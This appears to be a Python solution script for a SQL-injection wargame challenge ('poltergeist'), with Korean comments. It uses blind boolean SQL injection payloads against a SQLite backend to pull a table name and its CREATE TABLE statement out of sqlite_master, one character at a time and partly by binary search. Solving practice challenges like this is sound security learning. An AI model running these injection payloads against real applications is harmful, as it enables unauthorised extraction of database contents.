import string
from matplotlib.pyplot import table
import requests

url = "https://los.rubiya.kr/chall/poltergeist_a62c7abc7e6ce0080dbf0e14a07d1f1d.php?"
params = {"pw" : None}
cookies = {"PHPSESSID" : "7jocdhdj9b00ob8q1cfc13oos6"}

# 테이블 명 - 길이
pw_len = 0
for i in range(5,30):
    params["pw"] = "' or length((select tbl_name from sqlite_master limit 1,1)) = {} --".format(i)
    response = requests.get(url,params=params,cookies=cookies)
    print(params)
    if "Hello guest" in response.text:
        print("find the pw_len ", i)
        pw_len = i
        break

domain = string.digits + string.ascii_lowercase

# 테이블 명
table_name = 'flag_'
for i in range(6,pw_len + 1):
    for j in domain:
        params["pw"] = "' or substr((select tbl_name from sqlite_master limit 1,1),{},1) = '{}'-- ".format(i,j)
        response = requests.get(url,params=params,cookies=cookies)
        print(params)
        if "Hello guest" in response.text:
            table_name += j
            print("find the table_name ", table_name)
            break


# sql 문 알아내기 - 이진 탐색 이용
sql = "CREATE TABLE flag_70c81d99"
for i in range(28,100):
    start,end= 0,127
    while True:
        search = (start + end) // 2
        params["pw"] = "' or unicode(substr((select sql from sqlite_master where tbl_name='flag_70c81d99'),{},1)) <= {}-- ".format(i,search)
        response = requests.get(url,params=params,cookies=cookies)
        print(params)
        if "Hello guest" in response.text:
            params["pw"] = "' or unicode(substr((select sql from sqlite_master where tbl_name='flag_70c81d99'),{},1)) = {}-- ".format(i,search)
            response = requests.get(url,params=params,cookies=cookies)
            print(params)
            if "Hello guest" in response.text:
                sql += chr(search)
                print("[{}] : {}".format(i,sql))
                break
            end = search
        else:
            start = search


